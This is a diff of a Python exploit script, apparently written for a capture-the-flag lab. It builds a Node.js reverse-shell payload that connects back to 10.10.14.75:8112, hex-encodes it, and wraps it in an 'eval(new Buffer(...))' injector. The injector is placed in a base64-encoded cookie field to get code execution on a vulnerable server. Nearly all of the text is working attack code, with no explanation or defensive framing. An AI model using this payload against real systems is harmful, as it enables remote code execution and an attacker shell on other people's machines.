@@ -7,15 +7,13 @@
 import sys
 import base64
 
-
-
-
 def charencode(string):
     """String.CharCode"""
     encoded = ''
     for char in string:
         encoded = encoded + "," + str(ord(char))
     return encoded[1:]
+
 
 IP_ADDR='10.10.14.75'
 PORT='8112'
@@ -45,13 +43,15 @@ function c(HOST,PORT) {
 }
 c(HOST,PORT);
 ''' % (IP_ADDR, PORT)
+
 payload = NODEJS_REV_SHELL
 payload = payload.encode('hex')
 injector = "eval(new Buffer('%s', 'hex').toString());//" % payload
-cookie = '{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"%s"}' % injector
+print injector
 
+'''
+print "eval(String.fromCharCode(%s))" % (payload)
+cookie = '{"username":"admin","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"%s"}' % injector
 cookie = base64.b64encode(cookie)
 print(cookie)
-
-#PAYLOAD = charencode("eval('2+2+');")
-#print "eval(String.fromCharCode(%s))" % (PAYLOAD)
+'''
